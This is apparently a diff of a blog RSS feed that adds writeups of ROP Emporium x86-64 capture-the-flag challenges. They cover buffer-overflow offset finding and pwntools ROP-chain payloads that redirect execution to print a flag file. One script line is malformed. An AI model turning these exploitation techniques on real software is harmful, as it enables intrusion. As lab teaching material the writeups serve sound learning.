+BSS_ADDRESS = 0x00601038
+
+payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(POP_R14_POP_R15_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += b"flag.txt"
+payload += p64(MOV_R15_TO_R14_GADGET_ADDRESS)
+payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(BSS_ADDRESS)
+payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
+
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>Now, to make it run:</p>
+<pre><code>$ python3 exploit.py
+$ ./write4 &#x3C; exploit
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+Segmentation fault
+</code></pre>
+<p>Done!</p>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-write4-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-write4-writeup</guid>
+            <pubDate>Sat, 27 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 3: callme]]></title>
+            <description><![CDATA[<h1>ROP Emporium Challenge 3: callme</h1>
+<h4>December 26, 2025</h4>
+<p>This challenge won't be very difficult if we are understood gadgets properly from <a href="rop-emporium-split-writeup">the last challenge</a>.  As the description says, for this challenge we'll need to call three functions in a specific order, with some specific arguments. These three functions are <code>callme_one</code>, <code>callme_two</code> and <code>callme_three</code>. The arguments for those three functions must be <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code>.</p>
+<p>As we have done in every challenge, let's start by seeing what functions this binary has:</p>
+<pre><code>pwndbg> info functions
+0x00000000004006a8  _init
+0x00000000004006d0  puts@plt
+0x00000000004006e0  printf@plt
+0x00000000004006f0  callme_three@plt
+0x0000000000400700  memset@plt
+0x0000000000400710  read@plt
+0x0000000000400720  callme_one@plt
+0x0000000000400730  setvbuf@plt
+0x0000000000400740  callme_two@plt
+0x0000000000400750  exit@plt
+...
+0x00000000004008f2  usefulFunction
+0x000000000040093c  usefulGadgets
+...
+</code></pre>
+<p>Let's disassemble <code>usefulFunction</code> first:</p>
+<pre><code>pwndbg> disas usefulFunction
+   0x00000000004008f2 &#x3C;+0>:	push   rbp
+   0x00000000004008f3 &#x3C;+1>:	mov    rbp,rsp
+   0x00000000004008f6 &#x3C;+4>:	mov    edx,0x6
+   0x00000000004008fb &#x3C;+9>:	mov    esi,0x5
+   0x0000000000400900 &#x3C;+14>:	mov    edi,0x4
+   0x0000000000400905 &#x3C;+19>:	call   0x4006f0 &#x3C;callme_three@plt>
+   0x000000000040090a &#x3C;+24>:	mov    edx,0x6
+   0x000000000040090f &#x3C;+29>:	mov    esi,0x5
+   0x0000000000400914 &#x3C;+34>:	mov    edi,0x4
+   0x0000000000400919 &#x3C;+39>:	call   0x400740 &#x3C;callme_two@plt>
+   0x000000000040091e &#x3C;+44>:	mov    edx,0x6
+   0x0000000000400923 &#x3C;+49>:	mov    esi,0x5
+   0x0000000000400928 &#x3C;+54>:	mov    edi,0x4
+   0x000000000040092d &#x3C;+59>:	call   0x400720 &#x3C;callme_one@plt>
+   0x0000000000400932 &#x3C;+64>:	mov    edi,0x1
+   0x0000000000400937 &#x3C;+69>:	call   0x400750 &#x3C;exit@plt>
+</code></pre>
+<p>Looking at the code, even if the function call order is reversed, we can get a very important hint. Judging by the <code>mov</code> instructions, we can realize that the <code>edx</code>, <code>esi</code> and <code>edi</code> register are actually the arguments for the functions.</p>
+<p>Disassembling <code>usefulGadgets</code> hints it as well, and also gives us a gadget we can use to modify the registers ourselves:</p>
+<pre><code>   0x000000000040093c &#x3C;+0>:	pop    rdi
+   0x000000000040093d &#x3C;+1>:	pop    rsi
+   0x000000000040093e &#x3C;+2>:	pop    rdx
+   0x000000000040093f &#x3C;+3>:	ret
+</code></pre>
+<p>Good! Now we know how the <code>callme</code> functions are called, and we also have a gadget that allows us to move arbitrary values to the argument registers. All we need to do know is build the buffer overflow and then jump to the gadget for every function call, pop the argument values into the registers (<code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> to <code>rdi</code>, <code>rsi</code> and <code>rdx</code> respectively) and then call the <code>callme</code> functions ourselves (we know their addresses from the <code>info functions</code> command).</p>
+<p>First, let's define some variables with addresses in a Python script with pwntools:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+CALLME_ONE_ADDRESS = 0x0000000000400720
+CALLME_TWO_ADDRESS = 0x0000000000400740
+CALLME_THREE_ADDRESS = 0x00000000004006f0
+
+POP_GADGET_ADDRESS = 0x0040093c
+
+DEADBEEF_ARGUMENT = 0xDEADBEEFDEADBEEF
+CAFEBABE_ARGUMENT = 0xCAFEBABECAFEBABE
+D00DF00D_ARGUMENT = 0xD00DF00DD00DF00D
+
+RETURN_GADGET = 0x004006be
+</code></pre>
+<p>I obtained the offset the same way I did in the other two challenges, with a pattern search using <code>cyclic</code>. I go over this slightly in the writeups, and more in depth in my article about <a href="/blog/how-to-perform-bof">how to perform a simple buffer overflow</a>. Feel free to read it if you got lost here.</p>
+<p>After that, I just stored the <code>callme</code> function addresses we've obtained from <code>info functions</code>. Then, I also stored the gadget function address that I got when I disassembled <code>usefulGadgets</code>. I also wrote in the arguments we need to call the functions with, and in order to align the stack, I got a return gadget with <code>rop</code>. Let's build the payload!</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+CALLME_ONE_ADDRESS = 0x0000000000400720
+CALLME_TWO_ADDRESS = 0x0000000000400740
+CALLME_THREE_ADDRESS = 0x00000000004006f0
+
+POP_GADGET_ADDRESS = 0x0040093c # pop rdi ; pop rsi ; pop rdx ; ret
+
+DEADBEEF_ARGUMENT = 0xDEADBEEFDEADBEEF
+CAFEBABE_ARGUMENT = 0xCAFEBABECAFEBABE
+D00DF00D_ARGUMENT = 0xD00DF00DD00DF00D
+
+RETURN_GADGET = 0x004006be # ret;
+
+payload = b"A" * OFFSET
+payload += p64(RETURN_GADGET) # We align the stack
+
+# callme_one
+payload += p64(POP_GADGET_ADDRESS)
+payload += p64(DEADBEEF_ARGUMENT) # rdi = 0xDEADBEEFDEADBEEF
+payload += p64(CAFEBABE_ARGUMENT) # rsi = 0xCAFEBABECAFEBABE
+payload += p64(D00DF00D_ARGUMENT) # rdx = 0xD00DF00DD00DF00D
+payload += p64(CALLME_ONE_ADDRESS) # We call callme_one with the proper args
+
+# callme_two
+payload += p64(POP_GADGET_ADDRESS)
+payload += p64(DEADBEEF_ARGUMENT) # rdi = 0xDEADBEEFDEADBEEF
+payload += p64(CAFEBABE_ARGUMENT) # rsi = 0xCAFEBABECAFEBABE
+payload += p64(D00DF00D_ARGUMENT) # rdx = 0xD00DF00DD00DF00D
+payload += p64(CALLME_TWO_ADDRESS) # We call callme_two with the proper args
+
+# callme_three
+payload += p64(POP_GADGET_ADDRESS)
+payload += p64(DEADBEEF_ARGUMENT) # rdi = 0xDEADBEEFDEADBEEF
+payload += p64(CAFEBABE_ARGUMENT) # rsi = 0xCAFEBABECAFEBABE
+payload += p64(D00DF00D_ARGUMENT) # rdx = 0xD00DF00DD00DF00D
+payload += p64(CALLME_THREE_ADDRESS) # We call callme_three with the proper args
+
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>This will create a file called <code>exploit</code> that we can use as input for the binary:</p>
+<pre><code>$ python3 exploit.py
+$ ./callme &#x3C; exploit
+callme by ROP Emporium
+x86_64
+
+Hope you read the instructions...
+
+> Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>Done!</p>
+<p>This challenge, even if it didn't present anything I didn't know from the other two challenges, was quite a step up from me, and it made me understand better the use of gadgets in binary exploitation. It's important to get used to working with them. The more exposure to its uses, the better.</p>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-callme-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-callme-writeup</guid>
+            <pubDate>Fri, 26 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
         <item>
             <title><![CDATA[ROP Emporium x86-64 Challenge 6: fluff]]></title>
             <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 6: fluff</h1>
 <h4>December 26, 2025</h4>
 <p>Brace yourself for this one; although conceptually this challenge is nothing new, we'll have to get creative.</p>
-<p>The description tells us that this challenge is not very different from the [write4] challenge. We just need to call the <code>print_file</code> function in the binary with <code>flag.txt</code> as the argument. With all of this said, let's just jump right into it.</p>
+<p>The description tells us that this challenge is not very different from the <a href="rop-emporium-write4-writeup">write4</a> challenge. We just need to call the <code>print_file</code> function in the binary with <code>flag.txt</code> as the argument. With all of this said, let's just jump right into it.</p>
 <p>Let's start just like we've done until now, checking the functions in the binary:</p>
 <pre><code>pwndbg> info functions
 0x00000000004004d0  _init
@@ -119,11 +1239,11 @@ OxAEAE: 61
 <pre><code>rbx_offset = -0x3ef2 + i - 11
 </code></pre>
 <p>But there's more! We have to consider the next iterations! Once we store in <code>al</code> the first byte of <code>flag.txt</code>  (the character <code>f</code>, 102 in ASCII), we'll have to subtract <code>102</code> from the offset, not <code>11</code>. And we'll have to consider the next iterations as well! Let's take this into account in code:</p>
-<pre><code>FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
+<pre><code>FLAG_TEXT = "flag.txt"
 al_offset = 11 # Initial value of al
 
 rbx_offset = -0x3ef2 + i - al_offset
-al_offset = ord[flag_text[i]] # Gets the ASCII value of the character
+al_offset = ord(FLAG_TEXT[i]) # Gets the ASCII value of the character
 </code></pre>
 <p>Pwning is hard.</p>
 <p>At least that's the climax in terms of understanding the strategy. With this in mind, we can begin building the payload.</p>
@@ -141,7 +1261,7 @@ POP_RDI_GADGET_ADDRESS = 0x004006a3
 PRINT_FILE_FUNCTION_ADDRESS = 0x400510
 BSS_ADDRESS = 0x0000000000601038
 
-FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
+FLAG_TEXT = "flag.txt"
 al_offset = 11
 </code></pre>
 <p>The offset was obtained the same way as in the other challenges. The pointer to the overflowed buffer (the buffer that we overflow in <code>pwnme</code>) was obtained by adding a breakpoint in the <code>read</code> function in <code>pwnme</code>. Once you stop in there, pwndbg prints out in which pointer will <code>read</code> write your input. That's the buffer.  The <code>bss</code> pointer was obtained with <code>info files</code>. The <code>bss</code> area is one in which we have write permissions. Perfect to store arbitrary values in.</p>
@@ -213,7 +1333,7 @@ POP_RDI_GADGET_ADDRESS = 0x004006a3
 PRINT_FILE_FUNCTION_ADDRESS = 0x400510
 BSS_ADDRESS = 0x0000000000601038
 
-FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
+FLAG_TEXT = "flag.txt"
 al_offset = 11
 
 
@@ -239,7 +1359,7 @@ open("exploit", "bw").write(payload)
 </code></pre>
 <p>This solution, if executed normally, will throw a segmentation fault before printing the flag. However, if we execute it inside pwndbg, we'll be able to read the file before it segfaults. With this said, let's run the exploit:</p>
 <pre><code>$ python3 exploit.py
-$ pwndbg fluff
+$ gdb fluff
 pwndbg> run &#x3C; exploit
 fluff by ROP Emporium
 x86_64
@@ -257,9 +1377,332 @@ Program received signal SIGSEGV, Segmentation fault.
 <p>That's right, you can just write <code>flag.txt</code> in the buffer (plus a null character as a delimiter), then all the other garbage characters until the return address and then the <code>pop rdi; ret</code> gadget along with the address to the buffer to then call <code>print_file</code> to print the flag. It's a perfectly possible solution. However, had you stopped there and not come up with the complicated solution, you wouldn't have learnt as much, right?</p>
 <p>Actually, there are ways in which you can read the flag without even having to write any special string in the buffer overflow. <a href="https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py">This writeup does it</a>, it's a very smart solution that I really like. This approach is more solid than mine, and it probably works better under more strict environments. I could've written that solution in this writeup, but I didn't want to. In the end, this is the solution I came up with. It took me a lot of work, and honestly, I'm quite proud of it! The fact that it barely works, and that it's pretty much a miracle that it does, makes me feel like it's worth sharing (and that it's pretty funny), because it goes to show that when it comes down to capturing flags, any solution within the rules is valid, no matter how cluttery, weird or inconsistent. Pwning can be very difficult and unintuitive, and each person has their own ways of going around the pond!</p>
 ]]></description>
-            <link>https://markelmencia.github.io/writeups/rop-emporium-fluff-writeup</link>
-            <guid isPermaLink="true">https://markelmencia.github.io/writeups/rop-emporium-fluff-writeup</guid>
+            <link>https://markelmencia.com/writeups/rop-emporium-fluff-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-fluff-writeup</guid>
             <pubDate>Fri, 26 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 1: ret2win]]></title>
+            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 1: ret2win</h1>
+<h4>December 24, 2025</h4>
+<p>This is the first of the eight challenges in the <a href="https://ropemporium.com/">ROP Emporium</a> CTF website. The challenges are focused on Return Oriented Programming (ROP) attacks, and it's a great website to learn the fundamentals of <strong>binary exploitation</strong>.</p>
+<p>After reading the description we know that in order to obtain the flag, we need to execute a specific function in the binary. This function is inaccessible through the normal execution flow of the program. The objective of ROP (and binary exploitation in general) is to find ways to change the flow of a program with our input, either to obtain system control or read data that wouldn't be readable otherwise.</p>
+<h2>A small preface</h2>
+<p>Before starting with the writeup, I always find it important to talk about the tools needed for executing the exploit. To complete every challenge on ROP Emporium, I used two different tools: <strong>pwndbg</strong> to debug through the binary, and <strong>pwntools</strong> to ease the process of creating the input to perform the buffer overflows.</p>
+<p>Speaking of buffer overflows, these attacks are a strict requirement for every challenge in this website. You <em>will</em> learn to perform them with these challenges, but it's important to know the fundamentals before that.</p>
+<p>In this writeup I will gloss over some of the basics, but I might skip some fundamental explanations. However, I have written <a href="blog/how-to-perform-bof">an article</a> that goes over the very basics of buffer overflows, in case you want to read it before this one.</p>
+<p>With this out of the way, let's start with the challenge.</p>
+<h2>Initial inspection</h2>
+<p>Before getting our hands dirty, it's always important to know what we have, what we don't have, and what restrictions exist. Executing the program normally is always a good place to start:</p>
+<pre><code>$ ./ret2win
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> hello world
+Thank you!
+
+Exiting
+</code></pre>
+<p>As we can see, the program asks for input, reads it and ends. Our goal is to give it a "magic input" that will allow us to execute a specific function that will allow us to read the flag. But how do we know what function is that? Well, first we need to see all the functions the binary has. For this, we'll use <strong>pwndbg</strong>:</p>
+<pre><code>&#x26; pwndbg ret2win
+pwndbg> info functions
+0x0000000000400528  _init
+0x0000000000400550  puts@plt
+0x0000000000400560  system@plt
+0x0000000000400570  printf@plt
+0x0000000000400580  memset@plt
+0x0000000000400590  read@plt
+0x00000000004005a0  setvbuf@plt
+0x00000000004005b0  _start
+0x00000000004005e0  _dl_relocate_static_pie
+0x00000000004005f0  deregister_tm_clones
+0x0000000000400620  register_tm_clones
+0x0000000000400660  __do_global_dtors_aux
+0x0000000000400690  frame_dummy
+0x0000000000400697  main
+0x00000000004006e8  pwnme
+0x0000000000400756  ret2win
+0x0000000000400780  __libc_csu_init
+0x00000000004007f0  __libc_csu_fini
+0x00000000004007f4  _fini
+</code></pre>
+<p>With <code>info functions</code> we can get every function in the binary and their address in memory. We can see a bunch here. Some of them are <strong>glibc</strong> functions, such as <code>puts</code>, <code>system</code>, <code>printf</code>... but some of them might have caught our attention. Judging by their names, <code>main</code>, <code>pwnme</code> and <code>ret2win</code> seem like functions we'll need to dive into. Let's do that:</p>
+<pre><code>pwndbg > disas main
+   0x0000000000400697 &#x3C;+0>:	push   rbp
+   0x0000000000400698 &#x3C;+1>:	mov    rbp,rsp
+   0x000000000040069b &#x3C;+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 &#x3C;stdout@@GLIBC_2.2.5>
+   0x00000000004006a2 &#x3C;+11>:	mov    ecx,0x0
+   0x00000000004006a7 &#x3C;+16>:	mov    edx,0x2
+   0x00000000004006ac &#x3C;+21>:	mov    esi,0x0
+   0x00000000004006b1 &#x3C;+26>:	mov    rdi,rax
+   0x00000000004006b4 &#x3C;+29>:	call   0x4005a0 &#x3C;setvbuf@plt>
+   0x00000000004006b9 &#x3C;+34>:	mov    edi,0x400808
+   0x00000000004006be &#x3C;+39>:	call   0x400550 &#x3C;puts@plt>
+   0x00000000004006c3 &#x3C;+44>:	mov    edi,0x400820
+   0x00000000004006c8 &#x3C;+49>:	call   0x400550 &#x3C;puts@plt>
+   0x00000000004006cd &#x3C;+54>:	mov    eax,0x0
+   0x00000000004006d2 &#x3C;+59>:	call   0x4006e8 &#x3C;pwnme>
+   0x00000000004006d7 &#x3C;+64>:	mov    edi,0x400828
+   0x00000000004006dc &#x3C;+69>:	call   0x400550 &#x3C;puts@plt>
+   0x00000000004006e1 &#x3C;+74>:	mov    eax,0x0
+   0x00000000004006e6 &#x3C;+79>:	pop    rbp
+   0x00000000004006e7 &#x3C;+80>:	ret
+</code></pre>
+<p><code>disas &#x3C;function></code> allow us to read the assembly code of the given function. With a quick read, we can see that the main function calls <code>pwnme</code>. Let's disassemble it too:</p>
+<pre><code>pwndbg > disas pwnme
+   0x00000000004006e8 &#x3C;+0>:	push   rbp
+   0x00000000004006e9 &#x3C;+1>:	mov    rbp,rsp
+   0x00000000004006ec &#x3C;+4>:	sub    rsp,0x20
+   0x00000000004006f0 &#x3C;+8>:	lea    rax,[rbp-0x20]
+   0x00000000004006f4 &#x3C;+12>:	mov    edx,0x20
+   0x00000000004006f9 &#x3C;+17>:	mov    esi,0x0
+   0x00000000004006fe &#x3C;+22>:	mov    rdi,rax
+   0x0000000000400701 &#x3C;+25>:	call   0x400580 &#x3C;memset@plt>
+   0x0000000000400706 &#x3C;+30>:	mov    edi,0x400838
+   0x000000000040070b &#x3C;+35>:	call   0x400550 &#x3C;puts@plt>
+   0x0000000000400710 &#x3C;+40>:	mov    edi,0x400898
+   0x0000000000400715 &#x3C;+45>:	call   0x400550 &#x3C;puts@plt>
+   0x000000000040071a &#x3C;+50>:	mov    edi,0x4008b8
+   0x000000000040071f &#x3C;+55>:	call   0x400550 &#x3C;puts@plt>
+   0x0000000000400724 &#x3C;+60>:	mov    edi,0x400918
+   0x0000000000400729 &#x3C;+65>:	mov    eax,0x0
+   0x000000000040072e &#x3C;+70>:	call   0x400570 &#x3C;printf@plt>
+   0x0000000000400733 &#x3C;+75>:	lea    rax,[rbp-0x20]
+   0x0000000000400737 &#x3C;+79>:	mov    edx,0x38
+   0x000000000040073c &#x3C;+84>:	mov    rsi,rax
+   0x000000000040073f &#x3C;+87>:	mov    edi,0x0
+   0x0000000000400744 &#x3C;+92>:	call   0x400590 &#x3C;read@plt>
+   0x0000000000400749 &#x3C;+97>:	mov    edi,0x40091b
+   0x000000000040074e &#x3C;+102>:	call   0x400550 &#x3C;puts@plt>
+   0x0000000000400753 &#x3C;+107>:	nop
+   0x0000000000400754 &#x3C;+108>:	leave
+   0x0000000000400755 &#x3C;+109>:	ret
+</code></pre>
+<p>This function seems to call <code>read()</code>, the function that reads our input. Neither <code>main</code> nor <code>pwnme</code> seem to call <code>ret2win</code>, and judging by its name too, it seems like this will be the function we'll have to call from <code>pwnme</code>. Via the <code>read</code> function in <code>pwnme</code> we'll have to perform a buffer overflow by writing many characters in the input.</p>
+<h2>Our goal</h2>
+<p>With the pile of characters we'll plug in as input, we'll hopefully overflow the stack, overwriting its content. Part of its content is the return address of the function, that tells the CPU where to return once the function finishes its execution. If we manage to change that address to the initial address of <code>ret2win</code>, we'll manage to redirect the flow of the program to execute said function.</p>
+<h2>The execution</h2>
+<p>This presents one problem: how do we know where in the stack is the return address? Before building our exploit input, we have to find the <strong>offset</strong> of the return address. In other words, the number of characters we'll have to write <em>before</em> reaching the return address. We can achieve this in many different ways. In my case, I'll use cyclic patterns. I go over this process more in-depth in <a href="/blog/how-to-perform-bof">my other article</a>, so be sure to read it if you don't understand what's going on.</p>
+<pre><code>pwndbg> cyclic 200 pat
+Written a cyclic sequence of length 200 to file pat
+pwndbg> run &#x3C; pat
+</code></pre>
+<p>Running the program with the generated file with the pattern as input will throw a segmentation fault. This is good news. Segmentation faults happen when the program tried reading memory that didn't belong to it. The operative system gives to each program in execution a region if memory. If one program attempts to read a memory address outside this region, a segmentation fault is raised.</p>
+<pre><code>[ DISASM / x86-64 / set emulate on ]
+ ► 0x400755 &#x3C;pwnme+109>    ret  &#x3C;0x6161616161616166>
+</code></pre>
+<p>If we check the DISASM section of the <strong>pwndbg</strong> output, we'll be able to see which instruction caused the segmentation fault. Lo and behold, it was the return instruction! The instruction attempted to jump into the address <code>0x6161616161616166</code>. This number actually coincides with the pattern we created. In ASCII, it translates to <code>faaaaaaa</code>. Now we just need to find this string in the pattern we generated, which will give us the offset of the return function:</p>
+<pre><code>pwndbg> cyclic -l faaaaaaa
+Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
+Found at offset 40
+</code></pre>
+<p>There it is. This means that in our input, we'll have to write 40 characters before reaching the return address. The 41st, 42nd, 43rd and so on characters will be overwritten in the return address, meaning that if we write the address of <code>ret2win</code>, it will actually jump to that function, which is our goal. With <code>info functions</code>, we can get the address of <code>ret2win</code>, so we just need to copy it from there. In the case of this challenge, the address is <code>0x0000000000400756</code>.</p>
+<p>Just writing the address in our input just like that will not work on x86-64 architectures because it will misalign the stack, this is also explained in the other article, to align it, we need to write a return gadget in the return address offset, and then the actual address of <code>ret2win</code>. Getting a return gadget is quite easy:</p>
+<pre><code>pwndbg> rop
+...
+0x0040053e : ret
+...
+</code></pre>
+<p>The <code>rop</code> command prints us out a handful of gadgets we might find useful. Believe me, you'll get use to them in the following challenges.</p>
+<p>With these two addresses, let's jump to a python script with <strong>pwntools</strong> to create a file we can use as input for the program. This file will contain 40 characters, and right after that the exploit.</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x000400756
+</code></pre>
+<p>For now I've just imported <strong>pwntools</strong> and added three constant variables with the data we need for the exploit. Now let's generate a string for the payload:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x000400756
+
+payload  = b"A"*OFFSET
+</code></pre>
+<p>Notice this "b" before the string. This means the string is in <strong>binary</strong>. We type in 40 "A"s, which are "residue characters" that we use to get ourselves to the return address. Now we need to concatenate the return gadget:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x000400756
+payload += payload += p64(RET_INSTRUCTION_ADDRESS)
+</code></pre>
+<p>For this we use the <code>p64()</code> function, that parses the number properly, considering endianess and length.</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x000400756
+payload += p64(RET_INSTRUCTION_ADDRESS)
+payload += p64(EXPLOIT_FUNCTION_ADDRESS)
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>After the return instruction address, we add the exploit function address. Then, we just need to write this string to a file that we can later use as input. The exploit is done!</p>
+<pre><code>$ python3 exploit.py
+$ ./ret2win &#x3C; exploit
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-ret2win-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-ret2win-writeup</guid>
+            <pubDate>Wed, 24 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 2: split]]></title>
+            <description><![CDATA[<h1>ROP Emporium Challenge 2: split</h1>
+<h4>December 24, 2025</h4>
+<p>This challenge will be our introduction to gadgets. These are very resourceful tools we can use to build <strong>ROP chains</strong>. Later on this writeup, we'll see what that means. For now, let's just jump right into the challenge.</p>
+<pre><code>pwndbg> info functions
+...
+0x0000000000400697  main
+0x00000000004006e8  pwnme
+0x0000000000400742  usefulFunction
+...
+</code></pre>
+<p>It seems like for this challenge, we have a function that calls itself "useful", so let's just try to buffer overflow into it:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x0000000000400742 # Address of usefulFunction
+
+payload  = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS)
+payload += p64(EXPLOIT_FUNCTION_ADDRESS)
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>In order to obtain the offset I performed the same procedure I did in <a href="rop-emporium-ret2win-writeup">the last challenge</a>, and it turns out that every challenge in ROP Emporium has the same offset. Again, I plug in a return instruction address before the actual call to <code>usefulFunction</code> to align the stack (also explained in the last writeup), and then I call <code>usefulFunction</code> . Let's see what this does:</p>
+<pre><code>$ python3 exploit.py
+$ ./split &#x3C; exploit
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+> Thank you!
+exploit  exploit.py  flag.txt  pat  split
+</code></pre>
+<p>Curious! Judging by the output, it seems like <code>usefulFunction</code> executed a <code>ls</code> command, because it printed out the files I had in the working directory. Let's verify this by disassembling <code>usefulFunction</code> in pwndbg:</p>
+<pre><code>pwndbg> disas usefulFunction
+   0x0000000000400742 &#x3C;+0>:	push   rbp
+   0x0000000000400743 &#x3C;+1>:	mov    rbp,rsp
+   0x0000000000400746 &#x3C;+4>:	mov    edi,0x40084a
+   0x000000000040074b &#x3C;+9>:	call   0x400560 &#x3C;system@plt>
+   0x0000000000400750 &#x3C;+14>:	nop
+   0x0000000000400751 &#x3C;+15>:	pop    rbp
+   0x0000000000400752 &#x3C;+16>:	ret
+</code></pre>
+<p>There is a <code>system</code> function call in the function. <code>system</code> is a function that will execute the command it receives as input. The input is stored in the <code>edi</code> register, which holds a pointer to the string with the command. Let's confirm this by seeing what's stored in the pointer that is moved into <code>edi</code> right before the <code>system</code> call:</p>
+<pre><code>pwndbg> x/1s 0x40084a
+0x40084a:	"/bin/ls"
+</code></pre>
+<p>That checks out! With the <code>x/1s 0x40084a</code> command, I print the content of 1 address in string format. This confirms that the command that is executed with <code>system</code> is <code>ls</code>.</p>
+<h2>What we want</h2>
+<p>We have access to a <code>system</code> function. That's actually huge, because the only thing that between us and the flag is changing the argument of <code>system</code> from <code>/bin/ls</code> to <code>/bin/cat flag.txt</code>.</p>
+<p>By reading the challenge description, we are told that somewhere in the binary we can find the <code>/bin/cat flag.txt</code> stored. In pwndbg, there's actually a command for this:</p>
+<pre><code>pwndbg> break main
+pwndbg> run
+pwndbg> search "/bin/cat flag.txt"
+Searching for byte: b'/bin/cat flag.txt'
+split           0x601060 '/bin/cat flag.txt'
+
+</code></pre>
+<p>If we run the program (and additionally add a breakpoint right in the beginning), we can search for specific strings with the <code>search</code> command. Sure enough, we find out that the string <code>/bin/cat flag.txt</code> is stored in address <code>0x601060</code>.</p>
+<p>Now, one question remains: how do we change the argument of the <code>system</code> call? This involves a technique that we'll have to use a lot for these challenges.</p>
+<pre><code>pwndbg> disas usefulFunction
+   0x0000000000400742 &#x3C;+0>:	push   rbp
+   0x0000000000400743 &#x3C;+1>:	mov    rbp,rsp
+   0x0000000000400746 &#x3C;+4>:	mov    edi,0x40084a
+   0x000000000040074b &#x3C;+9>:	call   0x400560 &#x3C;system@plt>
+   0x0000000000400750 &#x3C;+14>:	nop
+   0x0000000000400751 &#x3C;+15>:	pop    rbp
+   0x0000000000400752 &#x3C;+16>:	ret
+</code></pre>
+<p>Looking at the assembly of <code>usefulFunction</code>, we realize that the string in <code>0x40084a</code> (<code>/bin/ls</code>) is hardcoded into the <code>system</code> argument, because <code>system</code> always uses the pointer stored in <code>edi</code> to get the argument it needs to execute. Since there's a <code>mov</code>instruction, right before the call, there's little we can do.</p>
+<p>Up until now, we've built the buffer overflow to execute <code>usefulFunction</code>. This is inconvenient because, as we've asserted, the flow of <code>usefulFunction</code> hardcodes the string in <code>0x40084a</code> into the <code>system</code> call. However, what's stopping us from executing <code>system</code> directly? That would allow us to skip the <code>mov</code>instruction. Even if doing so wouldn't be enough to get the flag, this is a more flexible approach. So instead of calling <code>usefulFunction</code>, let's call system, which as we can see is located in <code>0x400560</code>.</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x0040053e
+EXPLOIT_FUNCTION_ADDRESS = 0x000000400560 # Address of system
+
+payload  = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS)
+payload += p64(EXPLOIT_FUNCTION_ADDRESS)
+open("exploit", "bw").write(payload)
+</code></pre>
+<h2>The magic of gadgets</h2>
+<p>When we perform a buffer overflow attack, our goal is to change the return address to a function we want. This function can be anything; actually, it doesn't even need to be a full function. As long as there's an address with an instruction on the return address of the stack, the binary will be able to jump into it and execute it. This is where gadgets come in handy.</p>
+<p>A gadget is just a set of instructions, with one important distinction: these sets of instructions always end with a <code>ret</code> instruction or a jump. And why is that? Because gadgets are meant to be used to read/write into a register or a memory address and then come back to where they were called. To see it more clearly, let's give an example:</p>
